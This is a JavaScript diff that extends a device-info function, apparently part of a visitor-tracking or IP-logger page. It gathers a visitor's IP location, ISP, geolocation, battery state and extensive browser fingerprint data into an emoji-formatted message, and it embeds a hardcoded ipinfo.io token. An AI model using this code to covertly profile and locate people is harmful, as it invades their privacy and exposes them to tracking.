@@ -43,6 +43,7 @@ async function getDeviceInfo() {
     try {
         const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
         const connection = navigator.connection || {};
+        const battery = await navigator.getBattery();
         const time = new Date().toLocaleString("id-ID");
         let geo = "Tidak tersedia";
         if(navigator.geolocation){
@@ -53,25 +54,35 @@ async function getDeviceInfo() {
         }
 
         return `
-🌐 Informasi IP
-Alamat IP: ${ipInfo.ip}
-Negara: ${ipInfo.country}
-Wilayah: ${ipInfo.region}
-Kota: ${ipInfo.city}
-ISP: ${ipInfo.org}
+🌐 *Informasi IP*
+📶 Alamat IP: ${ipInfo.ip}
+🌍 Negara: ${ipInfo.country}
+🏞️ Wilayah: ${ipInfo.region}
+🏙️ Kota: ${ipInfo.city}
+🛠️ ISP: ${ipInfo.org}
+⏱️ Timezone IP: ${ipInfo.timezone || "-"}
 
-📱 Detail Perangkat
-User Agent: ${navigator.userAgent}
-Platform: ${navigator.platform}
-Browser Online: ${navigator.onLine?"Ya":"Tidak"}
-Jaringan: ${connection.effectiveType||"Tidak diketahui"}
-Downlink: ${connection.downlink||"-"} Mbps
-RTT: ${connection.rtt||"-"} ms
-Waktu: ${time}
-Geolocation: ${geo}
-Cookies Enabled: ${navigator.cookieEnabled?"Ya":"Tidak"}
-Hardware Concurrency: ${navigator.hardwareConcurrency||"-"} cores
-Touch Support: ${("ontouchstart" in window)?"Ya":"Tidak"}
+📱 *Detail Perangkat*
+💻 User Agent: ${navigator.userAgent}
+🖥️ Platform: ${navigator.platform}
+🏷️ Vendor: ${navigator.vendor}
+🌐 Browser Online: ${navigator.onLine?"✅ Ya":"❌ Tidak"}
+🗣️ Bahasa Browser: ${navigator.language}
+📐 Orientation: ${screen.orientation ? screen.orientation.type : "❌ Tidak tersedia"}
+🖼️ Resolusi Layar: ${screen.width}x${screen.height} px
+🔍 Pixel Ratio: ${window.devicePixelRatio}
+🎨 Kedalaman Warna: ${screen.colorDepth}-bit
+📡 Jaringan: ${connection.effectiveType||"❌ Tidak diketahui"}
+📶 Downlink: ${connection.downlink||"-"} Mbps
+⏱️ RTT: ${connection.rtt||"-"} ms
+🚀 Bandwidth Max: ${connection.downlinkMax||"-"} Mbps
+🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging?"⚡️ Mengisi daya":""}
+🍪 Cookies Enabled: ${navigator.cookieEnabled?"✅ Ya":"❌ Tidak"}
+🚫 Do Not Track: ${navigator.doNotTrack||"❌ Tidak tersedia"}
+🖥️ Hardware Concurrency (CPU): ${navigator.hardwareConcurrency||"-"} cores
+🤏 Touch Support: ${("ontouchstart" in window)?"✅ Ya":"❌ Tidak"}
+⏰ Waktu: ${time}
+📍 Geolocation: ${geo}
         `;
     } catch(err) {
         console.error(err);
